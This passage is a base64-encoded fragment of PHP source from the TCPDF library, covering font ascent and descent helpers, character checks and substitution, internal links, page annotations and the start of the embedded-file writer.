UoJG1heHcpOwoJCQl9CgkJCSRmYmJveCA9IGFycmF5KDAsICgwIC0gJHRoaXMtPkZvbnREZXNjZW50KSwgJG1heHcsICR0aGlzLT5Gb250QXNjZW50KTsKCQl9CgkJcmV0dXJuICRmYmJveDsKCX0KCgkvKioKCSAqIENvbnZlcnQgYSByZWxhdGl2ZSBmb250IG1lYXN1cmUgaW50byBhYnNvbHV0ZSB2YWx1ZS4KCSAqIEBwYXJhbSBpbnQgJHMgRm9udCBtZWFzdXJlLgoJICogQHJldHVybiBmbG9hdCBBYnNvbHV0ZSBtZWFzdXJlLgoJICogQHNpbmNlIDUuOS4xODYgKDIwMTItMDktMTMpCgkgKi8KCXB1YmxpYyBmdW5jdGlvbiBnZXRBYnNGb250TWVhc3VyZSgkcykgewoJCXJldHVybiAoJHMgKiAkdGhpcy0+Rm9udFNpemUgLyAxMDAwKTsKCX0KCgkvKioKCSAqIFJldHVybnMgdGhlIGdseXBoIGJvdW5kaW5nIGJveCBvZiB0aGUgc3BlY2lmaWVkIGNoYXJhY3RlciBpbiB0aGUgY3VycmVudCBmb250IGluIHVzZXIgdW5pdHMuCgkgKiBAcGFyYW0gaW50ICRjaGFyIElucHV0IGNoYXJhY3RlciBjb2RlLgoJICogQHJldHVybiBmYWxzZXxhcnJheSBhcnJheSh4TWluLCB5TWluLCB4TWF4LCB5TWF4KSBvciBGQUxTRSBpZiBub3QgZGVmaW5lZC4KCSAqIEBzaW5jZSA1LjkuMTg2ICgyMDEyLTA5LTEzKQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Q2hhckJCb3goJGNoYXIpIHsKCQkkYyA9IGludHZhbCgkY2hhcik7CgkJaWYgKGlzc2V0KCR0aGlzLT5DdXJyZW50Rm9udFsnY3cnXVskY10pKSB7CgkJCS8vIGdseXBoIGlzIGRlZmluZWQgLi4uIHVzZSB6ZXJvIHdpZHRoICYgaGVpZ2h0IGZvciBnbHlwaHMgd2l0aG91dCBvdXRsaW5lcwoJCQkkcmVzdWx0ID0gYXJyYXkoMCwwLDAsMCk7CgkJCWlmIChpc3NldCgkdGhpcy0+Q3VycmVudEZvbnRbJ2NiYm94J11bJGNdKSkgewoJCQkJJHJlc3VsdCA9ICR0aGlzLT5DdXJyZW50Rm9udFsnY2Jib3gnXVskY107CgkJCX0KCQkJcmV0dXJuIGFycmF5X21hcChhcnJheSgkdGhpcywnZ2V0QWJzRm9udE1lYXN1cmUnKSwgJHJlc3VsdCk7CgkJfQoJCXJldHVybiBmYWxzZTsKCX0KCgkvKioKCSAqIFJldHVybiB0aGUgZm9udCBkZXNjZW50IHZhbHVlCgkgKiBAcGFyYW0gc3RyaW5nICRmb250IGZvbnQgbmFtZQoJICogQHBhcmFtIHN0cmluZyAkc3R5bGUgZm9udCBzdHlsZQoJICogQHBhcmFtIGZsb2F0ICRzaXplIFRoZSBzaXplIChpbiBwb2ludHMpCgkgKiBAcmV0dXJuIGludCBmb250IGRlc2NlbnQKCSAqIEBwdWJsaWMKCSAqIEBhdXRob3IgTmljb2xhIEFzdW5pCgkgKiBAc2luY2UgNC45LjAwMyAoMjAxMC0wMy0zMCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGdldEZvbnREZXNjZW50KCRmb250LCAkc3R5bGU9JycsICRzaXplPTApIHsKCQkkZm9udGRhdGEgPSAkdGhpcy0+QWRkRm9udCgkZm9udCwgJHN0eWxlKTsKCQkkZm9udGluZm8gPSAkdGhpcy0+Z2V0Rm9udEJ1ZmZlcigkZm9udGRhdGFbJ2ZvbnRrZXknXSk7CgkJaWYgKGlzc2V0KCRmb250aW5mb1snZGVzYyddWydEZXNjZW50J10pIEFORCAoJGZvbnRpbmZvWydkZXNjJ11bJ0Rlc2NlbnQnXSA8PSAwKSkgewoJCQkkZGVzY2VudCA9ICgtICRmb250aW5mb1snZGVzYyddWydEZXNjZW50J10gKiAkc2l6ZSAvIDEwMDApOwoJCX0gZWxzZSB7CgkJCSRkZXNjZW50ID0gKDEuMjE5ICogMC4yNCAqICRzaXplKTsKCQl9CgkJcmV0dXJuICgkZGVzY2VudCAvICR0aGlzLT5rKTsKCX0KCgkvKioKCSAqIFJldHVybiB0aGUgZm9udCBhc2NlbnQgdmFsdWUuCgkgKiBAcGFyYW0gc3RyaW5nICRmb250IGZvbnQgbmFtZQoJICogQHBhcmFtIHN0cmluZyAkc3R5bGUgZm9udCBzdHlsZQoJICogQHBhcmFtIGZsb2F0ICRzaXplIFRoZSBzaXplIChpbiBwb2ludHMpCgkgKiBAcmV0dXJuIGludCBmb250IGFzY2VudAoJICogQHB1YmxpYwoJICogQGF1dGhvciBOaWNvbGEgQXN1bmkKCSAqIEBzaW5jZSA0LjkuMDAzICgyMDEwLTAzLTMwKQoJICovCglwdWJsaWMgZnVuY3Rpb24gZ2V0Rm9udEFzY2VudCgkZm9udCwgJHN0eWxlPScnLCAkc2l6ZT0wKSB7CgkJJGZvbnRkYXRhID0gJHRoaXMtPkFkZEZvbnQoJGZvbnQsICRzdHlsZSk7CgkJJGZvbnRpbmZvID0gJHRoaXMtPmdldEZvbnRCdWZmZXIoJGZvbnRkYXRhWydmb250a2V5J10pOwoJCWlmIChpc3NldCgkZm9udGluZm9bJ2Rlc2MnXVsnQXNjZW50J10pIEFORCAoJGZvbnRpbmZvWydkZXNjJ11bJ0FzY2VudCddID4gMCkpIHsKCQkJJGFzY2VudCA9ICgkZm9udGluZm9bJ2Rlc2MnXVsnQXNjZW50J10gKiAkc2l6ZSAvIDEwMDApOwoJCX0gZWxzZSB7CgkJCSRhc2NlbnQgPSAxLjIxOSAqIDAuNzYgKiAkc2l6ZTsKCQl9CgkJcmV0dXJuICgkYXNjZW50IC8gJHRoaXMtPmspOwoJfQoKCS8qKgoJICogUmV0dXJuIHRydWUgaW4gdGhlIGNoYXJhY3RlciBpcyBwcmVzZW50IGluIHRoZSBzcGVjaWZpZWQgZm9udC4KCSAqIEBwYXJhbSBtaXhlZCAkY2hhciBDaGFyYWN0ZXIgdG8gY2hlY2sgKGludGVnZXIgdmFsdWUgb3Igc3RyaW5nKQoJICogQHBhcmFtIHN0cmluZyAkZm9udCBGb250IG5hbWUgKGZhbWlseSBuYW1lKS4KCSAqIEBwYXJhbSBzdHJpbmcgJHN0eWxlIEZvbnQgc3R5bGUuCgkgKiBAcmV0dXJuIGJvb2wgdHJ1ZSBpZiB0aGUgY2hhciBpcyBkZWZpbmVkLCBmYWxzZSBvdGhlcndpc2UuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNS45LjE1MyAoMjAxMi0wMy0yOCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIGlzQ2hhckRlZmluZWQoJGNoYXIsICRmb250PScnLCAkc3R5bGU9JycpIHsKCQlpZiAoaXNfc3RyaW5nKCRjaGFyKSkgewoJCQkvLyBnZXQgY2hhcmFjdGVyIGNvZGUKCQkJJGNoYXIgPSBUQ1BERl9GT05UUzo6VVRGOFN0cmluZ1RvQXJyYXkoJGNoYXIsICR0aGlzLT5pc3VuaWNvZGUsICR0aGlzLT5DdXJyZW50Rm9udCk7CgkJCSRjaGFyID0gJGNoYXJbMF07CgkJfQoJCWlmIChUQ1BERl9TVEFUSUM6OmVtcHR5X3N0cmluZygkZm9udCkpIHsKCQkJaWYgKFRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRzdHlsZSkpIHsKCQkJCXJldHVybiAoaXNzZXQoJHRoaXMtPkN1cnJlbnRGb250WydjdyddW2ludHZhbCgkY2hhcildKSk7CgkJCX0KCQkJJGZvbnQgPSAkdGhpcy0+Rm9udEZhbWlseTsKCQl9CgkJJGZvbnRkYXRhID0gJHRoaXMtPkFkZEZvbnQoJGZvbnQsICRzdHlsZSk7CgkJJGZvbnRpbmZvID0gJHRoaXMtPmdldEZvbnRCdWZmZXIoJGZvbnRkYXRhWydmb250a2V5J10pOwoJCXJldHVybiAoaXNzZXQoJGZvbnRpbmZvWydjdyddW2ludHZhbCgkY2hhcildKSk7Cgl9CgoJLyoqCgkgKiBSZXBsYWNlIG1pc3NpbmcgZm9udCBjaGFyYWN0ZXJzIG9uIHNlbGVjdGVkIGZvbnQgd2l0aCBzcGVjaWZpZWQgc3Vic3RpdHV0aW9ucy4KCSAqIEBwYXJhbSBzdHJpbmcgJHRleHQgVGV4dCB0byBwcm9jZXNzLgoJICogQHBhcmFtIHN0cmluZyAkZm9udCBGb250IG5hbWUgKGZhbWlseSBuYW1lKS4KCSAqIEBwYXJhbSBzdHJpbmcgJHN0eWxlIEZvbnQgc3R5bGUuCgkgKiBAcGFyYW0gYXJyYXkgJHN1YnMgQXJyYXkgb2YgcG9zc2libGUgY2hhcmFjdGVyIHN1YnN0aXR1dGlvbnMuIFRoZSBrZXkgaXMgdGhlIGNoYXJhY3RlciB0byBjaGVjayAoaW50ZWdlciB2YWx1ZSkgYW5kIHRoZSB2YWx1ZSBpcyBhIHNpbmdsZSBpbnRlZ2UgdmFsdWUgb3IgYW4gYXJyYXkgb2YgcG9zc2libGUgc3Vic3RpdHV0ZXMuCgkgKiBAcmV0dXJuIHN0cmluZyBQcm9jZXNzZWQgdGV4dC4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA1LjkuMTUzICgyMDEyLTAzLTI4KQoJICovCglwdWJsaWMgZnVuY3Rpb24gcmVwbGFjZU1pc3NpbmdDaGFycygkdGV4dCwgJGZvbnQ9JycsICRzdHlsZT0nJywgJHN1YnM9YXJyYXkoKSkgewoJCWlmIChlbXB0eSgkc3VicykpIHsKCQkJcmV0dXJuICR0ZXh0OwoJCX0KCQlpZiAoVENQREZfU1RBVElDOjplbXB0eV9zdHJpbmcoJGZvbnQpKSB7CgkJCSRmb250ID0gJHRoaXMtPkZvbnRGYW1pbHk7CgkJfQoJCSRmb250ZGF0YSA9ICR0aGlzLT5BZGRGb250KCRmb250LCAkc3R5bGUpOwoJCSRmb250aW5mbyA9ICR0aGlzLT5nZXRGb250QnVmZmVyKCRmb250ZGF0YVsnZm9udGtleSddKTsKCQkkdW5pYXJyID0gVENQREZfRk9OVFM6OlVURjhTdHJpbmdUb0FycmF5KCR0ZXh0LCAkdGhpcy0+aXN1bmljb2RlLCAkdGhpcy0+Q3VycmVudEZvbnQpOwoJCWZvcmVhY2ggKCR1bmlhcnIgYXMgJGsgPT4gJGNocikgewoJCQlpZiAoIWlzc2V0KCRmb250aW5mb1snY3cnXVskY2hyXSkpIHsKCQkJCS8vIHRoaXMgY2hhcmFjdGVyIGlzIG1pc3Npbmcgb24gdGhlIHNlbGVjdGVkIGZvbnQKCQkJCWlmIChpc3NldCgkc3Vic1skY2hyXSkpIHsKCQkJCQkvLyB3ZSBoYXZlIGF2YWlsYWJsZSBzdWJzdGl0dXRpb25zCgkJCQkJaWYgKGlzX2FycmF5KCRzdWJzWyRjaHJdKSkgewoJCQkJCQlmb3JlYWNoKCRzdWJzWyRjaHJdIGFzICRzKSB7CgkJCQkJCQlpZiAoaXNzZXQoJGZvbnRpbmZvWydjdyddWyRzXSkpIHsKCQkJCQkJCQkkdW5pYXJyWyRrXSA9ICRzOwoJCQkJCQkJCWJyZWFrOwoJCQkJCQkJfQoJCQkJCQl9CgkJCQkJfSBlbHNlaWYgKGlzc2V0KCRmb250aW5mb1snY3cnXVskc3Vic1skY2hyXV0pKSB7CgkJCQkJCSR1bmlhcnJbJGtdID0gJHN1YnNbJGNocl07CgkJCQkJfQoJCQkJfQoJCQl9CgkJfQoJCXJldHVybiBUQ1BERl9GT05UUzo6VW5pQXJyU3ViU3RyaW5nKFRDUERGX0ZPTlRTOjpVVEY4QXJyYXlUb1VuaUFycmF5KCR1bmlhcnIsICR0aGlzLT5pc3VuaWNvZGUpKTsKCX0KCgkvKioKCSAqIERlZmluZXMgdGhlIGRlZmF1bHQgbW9ub3NwYWNlZCBmb250LgoJICogQHBhcmFtIHN0cmluZyAkZm9udCBGb250IG5hbWUuCgkgKiBAcHVibGljCgkgKiBAc2luY2UgNC41LjAyNQoJICovCglwdWJsaWMgZnVuY3Rpb24gc2V0RGVmYXVsdE1vbm9zcGFjZWRGb250KCRmb250KSB7CgkJJHRoaXMtPmRlZmF1bHRfbW9ub3NwYWNlZF9mb250ID0gJGZvbnQ7Cgl9CgoJLyoqCgkgKiBDcmVhdGVzIGEgbmV3IGludGVybmFsIGxpbmsgYW5kIHJldHVybnMgaXRzIGlkZW50aWZpZXIuIEFuIGludGVybmFsIGxpbmsgaXMgYSBjbGlja2FibGUgYXJlYSB3aGljaCBkaXJlY3RzIHRvIGFub3RoZXIgcGxhY2Ugd2l0aGluIHRoZSBkb2N1bWVudC48YnIgLz4KCSAqIFRoZSBpZGVudGlmaWVyIGNhbiB0aGVuIGJlIHBhc3NlZCB0byBDZWxsKCksIFdyaXRlKCksIEltYWdlKCkgb3IgTGluaygpLiBUaGUgZGVzdGluYXRpb24gaXMgZGVmaW5lZCB3aXRoIFNldExpbmsoKS4KCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjUKCSAqIEBzZWUgQ2VsbCgpLCBXcml0ZSgpLCBJbWFnZSgpLCBMaW5rKCksIFNldExpbmsoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gQWRkTGluaygpIHsKCQkvLyBjcmVhdGUgYSBuZXcgaW50ZXJuYWwgbGluawoJCSRuID0gY291bnQoJHRoaXMtPmxpbmtzKSArIDE7CgkJJHRoaXMtPmxpbmtzWyRuXSA9IGFycmF5KCdwJyA9PiAwLCAneScgPT4gMCwgJ2YnID0+IGZhbHNlKTsKCQlyZXR1cm4gJG47Cgl9CgoJLyoqCgkgKiBEZWZpbmVzIHRoZSBwYWdlIGFuZCBwb3NpdGlvbiBhIGxpbmsgcG9pbnRzIHRvLgoJICogQHBhcmFtIGludCAkbGluayBUaGUgbGluayBpZGVudGlmaWVyIHJldHVybmVkIGJ5IEFkZExpbmsoKQoJICogQHBhcmFtIGZsb2F0ICR5IE9yZGluYXRlIG9mIHRhcmdldCBwb3NpdGlvbjsgLTEgaW5kaWNhdGVzIHRoZSBjdXJyZW50IHBvc2l0aW9uLiBUaGUgZGVmYXVsdCB2YWx1ZSBpcyAwICh0b3Agb2YgcGFnZSkKCSAqIEBwYXJhbSBpbnR8c3RyaW5nICRwYWdlIE51bWJlciBvZiB0YXJnZXQgcGFnZTsgLTEgaW5kaWNhdGVzIHRoZSBjdXJyZW50IHBhZ2UgKGRlZmF1bHQgdmFsdWUpLiBJZiB5b3UgcHJlZml4IGEgcGFnZSBudW1iZXIgd2l0aCB0aGUgKiBjaGFyYWN0ZXIsIHRoZW4gdGhpcyBwYWdlIHdpbGwgbm90IGJlIGNoYW5nZWQgd2hlbiBhZGRpbmcvZGVsZXRpbmcvbW92aW5nIHBhZ2VzLgoJICogQHB1YmxpYwoJICogQHNpbmNlIDEuNQoJICogQHNlZSBBZGRMaW5rKCkKCSAqLwoJcHVibGljIGZ1bmN0aW9uIHNldExpbmsoJGxpbmssICR5PTAsICRwYWdlPS0xKSB7CgkJJGZpeGVkID0gZmFsc2U7CgkJaWYgKCFlbXB0eSgkcGFnZSkgQU5EIChzdWJzdHIoJHBhZ2UsIDAsIDEpID09ICcqJykpIHsKCQkJJHBhZ2UgPSBpbnR2YWwoc3Vic3RyKCRwYWdlLCAxKSk7CgkJCS8vIHRoaXMgcGFnZSBudW1iZXIgd2lsbCBub3QgYmUgY2hhbmdlZCB3aGVuIG1vdmluZy9hZGQvZGVsZXRpbmcgcGFnZXMKCQkJJGZpeGVkID0gdHJ1ZTsKCQl9CgkJaWYgKCRwYWdlIDwgMCkgewoJCQkkcGFnZSA9ICR0aGlzLT5wYWdlOwoJCX0KCQlpZiAoJHkgPT0gLTEpIHsKCQkJJHkgPSAkdGhpcy0+eTsKCQl9CgkJJHRoaXMtPmxpbmtzWyRsaW5rXSA9IGFycmF5KCdwJyA9PiAkcGFnZSwgJ3knID0+ICR5LCAnZicgPT4gJGZpeGVkKTsKCX0KCgkvKioKCSAqIFB1dHMgYSBsaW5rIG9uIGEgcmVjdGFuZ3VsYXIgYXJlYSBvZiB0aGUgcGFnZS4KCSAqIFRleHQgb3IgaW1hZ2UgbGlua3MgYXJlIGdlbmVyYWxseSBwdXQgdmlhIENlbGwoKSwgV3JpdGUoKSBvciBJbWFnZSgpLCBidXQgdGhpcyBtZXRob2QgY2FuIGJlIHVzZWZ1bCBmb3IgaW5zdGFuY2UgdG8gZGVmaW5lIGEgY2xpY2thYmxlIGFyZWEgaW5zaWRlIGFuIGltYWdlLgoJICogQHBhcmFtIGZsb2F0ICR4IEFic2Npc3NhIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlCgkgKiBAcGFyYW0gZmxvYXQgJHkgT3JkaW5hdGUgb2YgdGhlIHVwcGVyLWxlZnQgY29ybmVyIG9mIHRoZSByZWN0YW5nbGUKCSAqIEBwYXJhbSBmbG9hdCAkdyBXaWR0aCBvZiB0aGUgcmVjdGFuZ2xlCgkgKiBAcGFyYW0gZmxvYXQgJGggSGVpZ2h0IG9mIHRoZSByZWN0YW5nbGUKCSAqIEBwYXJhbSBtaXhlZCAkbGluayBVUkwgb3IgaWRlbnRpZmllciByZXR1cm5lZCBieSBBZGRMaW5rKCkKCSAqIEBwYXJhbSBpbnQgJHNwYWNlcyBudW1iZXIgb2Ygc3BhY2VzIG9uIHRoZSB0ZXh0IHRvIGxpbmsKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSAxLjUKCSAqIEBzZWUgQWRkTGluaygpLCBBbm5vdGF0aW9uKCksIENlbGwoKSwgV3JpdGUoKSwgSW1hZ2UoKQoJICovCglwdWJsaWMgZnVuY3Rpb24gTGluaygkeCwgJHksICR3LCAkaCwgJGxpbmssICRzcGFjZXM9MCkgewoJCSR0aGlzLT5Bbm5vdGF0aW9uKCR4LCAkeSwgJHcsICRoLCAkbGluaywgYXJyYXkoJ1N1YnR5cGUnPT4nTGluaycpLCAkc3BhY2VzKTsKCX0KCgkvKioKCSAqIFB1dHMgYSBtYXJrdXAgYW5ub3RhdGlvbiBvbiBhIHJlY3Rhbmd1bGFyIGFyZWEgb2YgdGhlIHBhZ2UuCgkgKiAhISEhVEhFIEFOTk9UQVRJT04gU1VQUE9SVCBJUyBOT1QgWUVUIEZVTExZIElNUExFTUVOVEVEICEhISEKCSAqIEBwYXJhbSBmbG9hdCAkeCBBYnNjaXNzYSBvZiB0aGUgdXBwZXItbGVmdCBjb3JuZXIgb2YgdGhlIHJlY3RhbmdsZQoJICogQHBhcmFtIGZsb2F0ICR5IE9yZGluYXRlIG9mIHRoZSB1cHBlci1sZWZ0IGNvcm5lciBvZiB0aGUgcmVjdGFuZ2xlCgkgKiBAcGFyYW0gZmxvYXQgJHcgV2lkdGggb2YgdGhlIHJlY3RhbmdsZQoJICogQHBhcmFtIGZsb2F0ICRoIEhlaWdodCBvZiB0aGUgcmVjdGFuZ2xlCgkgKiBAcGFyYW0gc3RyaW5nICR0ZXh0IGFubm90YXRpb24gdGV4dCBvciBhbHRlcm5hdGUgY29udGVudAoJICogQHBhcmFtIGFycmF5ICRvcHQgYXJyYXkgb2Ygb3B0aW9ucyAoc2VlIHNlY3Rpb24gOC40IG9mIFBERiByZWZlcmVuY2UgMS43KS4KCSAqIEBwYXJhbSBpbnQgJHNwYWNlcyBudW1iZXIgb2Ygc3BhY2VzIG9uIHRoZSB0ZXh0IHRvIGxpbmsKCSAqIEBwdWJsaWMKCSAqIEBzaW5jZSA0LjAuMDE4ICgyMDA4LTA4LTA2KQoJICovCglwdWJsaWMgZnVuY3Rpb24gQW5ub3RhdGlvbigkeCwgJHksICR3LCAkaCwgJHRleHQsICRvcHQ9YXJyYXkoJ1N1YnR5cGUnPT4nVGV4dCcpLCAkc3BhY2VzPTApIHsKCQlpZiAoJHRoaXMtPmlueG9iaikgewoJCQkvLyBzdG9yZSBwYXJhbWV0ZXJzIGZvciBsYXRlciB1c2Ugb24gdGVtcGxhdGUKCQkJJHRoaXMtPnhvYmplY3RzWyR0aGlzLT54b2JqaWRdWydhbm5vdGF0aW9ucyddW10gPSBhcnJheSgneCcgPT4gJHgsICd5JyA9PiAkeSwgJ3cnID0+ICR3LCAnaCcgPT4gJGgsICd0ZXh0JyA9PiAkdGV4dCwgJ29wdCcgPT4gJG9wdCwgJ3NwYWNlcycgPT4gJHNwYWNlcyk7CgkJCXJldHVybjsKCQl9CgkJaWYgKCR4ID09PSAnJykgewoJCQkkeCA9ICR0aGlzLT54OwoJCX0KCQlpZiAoJHkgPT09ICcnKSB7CgkJCSR5ID0gJHRoaXMtPnk7CgkJfQoJCS8vIGNoZWNrIHBhZ2UgZm9yIG5vLXdyaXRlIHJlZ2lvbnMgYW5kIGFkYXB0IHBhZ2UgbWFyZ2lucyBpZiBuZWNlc3NhcnkKCQlsaXN0KCR4LCAkeSkgPSAkdGhpcy0+Y2hlY2tQYWdlUmVnaW9ucygkaCwgJHgsICR5KTsKCQkvLyByZWNhbGN1bGF0ZSBjb29yZGluYXRlcyB0byBhY2NvdW50IGZvciBncmFwaGljIHRyYW5zZm9ybWF0aW9ucwoJCWlmIChpc3NldCgkdGhpcy0+dHJhbnNmbWF0cml4KSBBTkQgIWVtcHR5KCR0aGlzLT50cmFuc2ZtYXRyaXgpKSB7CgkJCWZvciAoJGk9JHRoaXMtPnRyYW5zZm1hdHJpeF9rZXk7ICRpID4gMDsgLS0kaSkgewoJCQkJJG1heGlkID0gY291bnQoJHRoaXMtPnRyYW5zZm1hdHJpeFskaV0pIC0gMTsKCQkJCWZvciAoJGo9JG1heGlkOyAkaiA+PSAwOyAtLSRqKSB7CgkJCQkJJGN0bSA9ICR0aGlzLT50cmFuc2ZtYXRyaXhbJGldWyRqXTsKCQkJCQlpZiAoaXNzZXQoJGN0bVsnYSddKSkgewoJCQkJCQkkeCA9ICR4ICogJHRoaXMtPms7CgkJCQkJCSR5ID0gKCR0aGlzLT5oIC0gJHkpICogJHRoaXMtPms7CgkJCQkJCSR3ID0gJHcgKiAkdGhpcy0+azsKCQkJCQkJJGggPSAkaCAqICR0aGlzLT5rOwoJCQkJCQkvLyB0b3AgbGVmdAoJCQkJCQkkeHQgPSAkeDsKCQkJCQkJJHl0ID0gJHk7CgkJCQkJCSR4MSA9ICgkY3RtWydhJ10gKiAkeHQpICsgKCRjdG1bJ2MnXSAqICR5dCkgKyAkY3RtWydlJ107CgkJCQkJCSR5MSA9ICgkY3RtWydiJ10gKiAkeHQpICsgKCRjdG1bJ2QnXSAqICR5dCkgKyAkY3RtWydmJ107CgkJCQkJCS8vIHRvcCByaWdodAoJCQkJCQkkeHQgPSAkeCArICR3OwoJCQkJCQkkeXQgPSAkeTsKCQkJCQkJJHgyID0gKCRjdG1bJ2EnXSAqICR4dCkgKyAoJGN0bVsnYyddICogJHl0KSArICRjdG1bJ2UnXTsKCQkJCQkJJHkyID0gKCRjdG1bJ2InXSAqICR4dCkgKyAoJGN0bVsnZCddICogJHl0KSArICRjdG1bJ2YnXTsKCQkJCQkJLy8gYm90dG9tIGxlZnQKCQkJCQkJJHh0ID0gJHg7CgkJCQkJCSR5dCA9ICR5IC0gJGg7CgkJCQkJCSR4MyA9ICgkY3RtWydhJ10gKiAkeHQpICsgKCRjdG1bJ2MnXSAqICR5dCkgKyAkY3RtWydlJ107CgkJCQkJCSR5MyA9ICgkY3RtWydiJ10gKiAkeHQpICsgKCRjdG1bJ2QnXSAqICR5dCkgKyAkY3RtWydmJ107CgkJCQkJCS8vIGJvdHRvbSByaWdodAoJCQkJCQkkeHQgPSAkeCArICR3OwoJCQkJCQkkeXQgPSAkeSAtICRoOwoJCQkJCQkkeDQgPSAoJGN0bVsnYSddICogJHh0KSArICgkY3RtWydjJ10gKiAkeXQpICsgJGN0bVsnZSddOwoJCQkJCQkkeTQgPSAoJGN0bVsnYiddICogJHh0KSArICgkY3RtWydkJ10gKiAkeXQpICsgJGN0bVsnZiddOwoJCQkJCQkvLyBuZXcgY29vcmRpbmF0ZXMgKHJlY3RhbmdsZSBhcmVhKQoJCQkJCQkkeCA9IG1pbigkeDEsICR4MiwgJHgzLCAkeDQpOwoJCQkJCQkkeSA9IG1heCgkeTEsICR5MiwgJHkzLCAkeTQpOwoJCQkJCQkkdyA9IChtYXgoJHgxLCAkeDIsICR4MywgJHg0KSAtICR4KSAvICR0aGlzLT5rOwoJCQkJCQkkaCA9ICgkeSAtIG1pbigkeTEsICR5MiwgJHkzLCAkeTQpKSAvICR0aGlzLT5rOwoJCQkJCQkkeCA9ICR4IC8gJHRoaXMtPms7CgkJCQkJCSR5ID0gJHRoaXMtPmggLSAoJHkgLyAkdGhpcy0+ayk7CgkJCQkJfQoJCQkJfQoJCQl9CgkJfQoJCWlmICgkdGhpcy0+cGFnZSA8PSAwKSB7CgkJCSRwYWdlID0gMTsKCQl9IGVsc2UgewoJCQkkcGFnZSA9ICR0aGlzLT5wYWdlOwoJCX0KCQlpZiAoIWlzc2V0KCR0aGlzLT5QYWdlQW5ub3RzWyRwYWdlXSkpIHsKCQkJJHRoaXMtPlBhZ2VBbm5vdHNbJHBhZ2VdID0gYXJyYXkoKTsKCQl9CgkJJHRoaXMtPlBhZ2VBbm5vdHNbJHBhZ2VdW10gPSBhcnJheSgnbicgPT4gKyskdGhpcy0+biwgJ3gnID0+ICR4LCAneScgPT4gJHksICd3JyA9PiAkdywgJ2gnID0+ICRoLCAndHh0JyA9PiAkdGV4dCwgJ29wdCcgPT4gJG9wdCwgJ251bXNwYWNlcycgPT4gJHNwYWNlcyk7CgkJaWYgKCEkdGhpcy0+cGRmYV9tb2RlIHx8ICgkdGhpcy0+cGRmYV9tb2RlICYmICR0aGlzLT5wZGZhX3ZlcnNpb24gPT0gMykpIHsKCQkJaWYgKCgoJG9wdFsnU3VidHlwZSddID09ICdGaWxlQXR0YWNobWVudCcpIE9SICgkb3B0WydTdWJ0eXBlJ10gPT0gJ1NvdW5kJykpIEFORCAoIVRDUERGX1NUQVRJQzo6ZW1wdHlfc3RyaW5nKCRvcHRbJ0ZTJ10pKQoJCQkJQU5EIChAVENQREZfU1RBVElDOjpmaWxlX2V4aXN0cygkb3B0WydGUyddKSBPUiBUQ1BERl9TVEFUSUM6OmlzVmFsaWRVUkwoJG9wdFsnRlMnXSkpCgkJCQlBTkQgKCFpc3NldCgkdGhpcy0+ZW1iZWRkZWRmaWxlc1tiYXNlbmFtZSgkb3B0WydGUyddKV0pKSkgewoJCQkJJHRoaXMtPmVtYmVkZGVkZmlsZXNbYmFzZW5hbWUoJG9wdFsnRlMnXSldID0gYXJyYXkoJ2YnID0+ICsrJHRoaXMtPm4sICduJyA9PiArKyR0aGlzLT5uLCAnZmlsZScgPT4gJG9wdFsnRlMnXSk7CgkJCX0KCQl9CgkJLy8gQWRkIHdpZGdldHMgYW5ub3RhdGlvbidzIGljb25zCgkJaWYgKGlzc2V0KCRvcHRbJ21rJ11bJ2knXSkgQU5EIEBUQ1BERl9TVEFUSUM6OmZpbGVfZXhpc3RzKCRvcHRbJ21rJ11bJ2knXSkpIHsKCQkJJHRoaXMtPkltYWdlKCRvcHRbJ21rJ11bJ2knXSwgJycsICcnLCAxMCwgMTAsICcnLCAnJywgJycsIGZhbHNlLCAzMDAsICcnLCBmYWxzZSwgZmFsc2UsIDAsIGZhbHNlLCB0cnVlKTsKCQl9CgkJaWYgKGlzc2V0KCRvcHRbJ21rJ11bJ3JpJ10pIEFORCBAVENQREZfU1RBVElDOjpmaWxlX2V4aXN0cygkb3B0WydtayddWydyaSddKSkgewoJCQkkdGhpcy0+SW1hZ2UoJG9wdFsnbWsnXVsncmknXSwgJycsICcnLCAwLCAwLCAnJywgJycsICcnLCBmYWxzZSwgMzAwLCAnJywgZmFsc2UsIGZhbHNlLCAwLCBmYWxzZSwgdHJ1ZSk7CgkJfQoJCWlmIChpc3NldCgkb3B0WydtayddWydpeCddKSBBTkQgQFRDUERGX1NUQVRJQzo6ZmlsZV9leGlzdHMoJG9wdFsnbWsnXVsnaXgnXSkpIHsKCQkJJHRoaXMtPkltYWdlKCRvcHRbJ21rJ11bJ2l4J10sICcnLCAnJywgMCwgMCwgJycsICcnLCAnJywgZmFsc2UsIDMwMCwgJycsIGZhbHNlLCBmYWxzZSwgMCwgZmFsc2UsIHRydWUpOwoJCX0KCX0KCgkvKioKCSAqIEVtYmVkZCB0aGUgYXR0YWNoZWQgZmlsZXMuCgkgKiBAc2luY2UgNC40LjAwMCAoMjAwOC0xMi0wNykKCSAqIEBwcm90ZWN0ZWQKCSAqIEBzZWUgQW5ub3RhdGlvbigpCgkgKi8KCXByb3RlY3RlZCBmdW5jdGlvbiBfcHV0RW1iZWRkZWRGaWxlcygpIHsKCQlpZiAoJHRoaXMtPnBkZmFfbW9kZSAmJiAkdGhpcy0+cGRmYV92ZXJzaW9uICE9IDMpICB7CgkJCS8vIGVtYmVkZGVkIGZpbGVzIGFyZSBub3QgYWxsb3dlZCBpbiBQREYvQSBtb2RlIHZlcnNpb24gMSBhbmQgMgoJCQlyZXR1cm47CgkJfQoJCXJlc2V0KCR0aGlzLT5lbWJlZGRlZGZpbGVzKTsKCQlmb3JlYWNoICgkdGhpcy0+ZW1iZWRkZWRmaWxlcyBhcyAkZmlsZW5hbWUgPT4gJGZpbGVkYXRhKSB7CgkJICAgICRkYXRhID0gJHRoaXMtPmdldENhY2hlZEZpbGVDb250ZW50cygkZmlsZWRhdGFbJ2ZpbGUnXSk7CgkJCWlmICgkZGF0YSAhPT0gRkFMU0UpIHsKCQkJCSRyYXdzaXplID0gc3RybGVuKCRkYXRhKTsKCQkJCWlmICgkcmF3c2l6ZSA+IDApIHsKCQkJCQkvLyB1cG